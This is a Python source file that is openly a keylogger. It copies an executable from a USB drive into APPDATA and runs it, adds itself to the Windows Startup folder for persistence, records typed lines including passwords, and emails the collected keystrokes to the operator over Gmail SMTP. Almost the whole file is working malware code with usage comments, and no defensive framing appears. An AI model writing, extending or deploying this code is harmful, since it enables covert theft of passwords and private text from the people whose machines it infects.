import os #pip install os
import shutil #pip install shutil
import keyboard #pip install keyboard
import smtplib #pip install smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart



# Funcion that is doing the "sending the email"
def send_email(subject, body):
    smtp_server = "smtp.gmail.com" #You can give here an any smtp_server.
    smtp_port = 587
    sender_email = "ssender_email"
    receiver_email = "receiver_email"
    password = "Your_password_to_email"

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, msg.as_string())
        server.close()
        print("E-mail was suscefully send.")
    except Exception as e:
        print(f"Error with email: {e}")

# Function to find a avalibe USB
def find_usb():
    for drive in 'DEFGHIJKLMNOPQRSTUVWXYZ':  # Searching USB
        if os.path.exists(f"{drive}:\\"):
            return f"{drive}:\\"
    return None

def add_to_startup_folder():
    exe_path = os.path.join(os.getenv('APPDATA'), 'logger.exe') #Ist going to appdata
    startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup') #Its going to automaticly start

    shutil.copy(exe_path, startup_folder)
    print("Program was added to Startup.")

# Funciton to copy .exe file to appdata
def copy_and_run():
    usb_drive = find_usb()
    exe_name = "logger.exe"

    if usb_drive:
        exe_path = os.path.join(usb_drive, "dist", exe_name) #If you dont wanna use dist, just do "/"
    else:
        exe_path = os.path.join(os.getenv('APPDATA'), exe_name)

    target_path = os.path.join(os.getenv('APPDATA'), exe_name)

    if usb_drive and os.path.exists(exe_path):  # If the USB is avalibe, it will copy to target_path
        shutil.copy(exe_path, target_path)
        print(f"{exe_name} byl zkopírován do {target_path}")

    if os.path.exists(target_path):  # Start the file
        os.system(f'"{target_path}"')

#Funcion for recording keys
def record_keys():
    path = os.path.join(os.getenv('APPDATA'), "data.txt") #data.txt

    while True:
        events = keyboard.record('enter')
        password = list(keyboard.get_typed_strings(events))

        with open(path, 'a') as data_file:
            data_file.write('\n')
            data_file.write(password[0])

        with open(path, 'r') as file: #It will send you to the email, the data
            data_content = file.read()
        send_email("Keylogger data", data_content)

# Turn on

copy_and_run()
add_to_startup_folder()
record_keys()
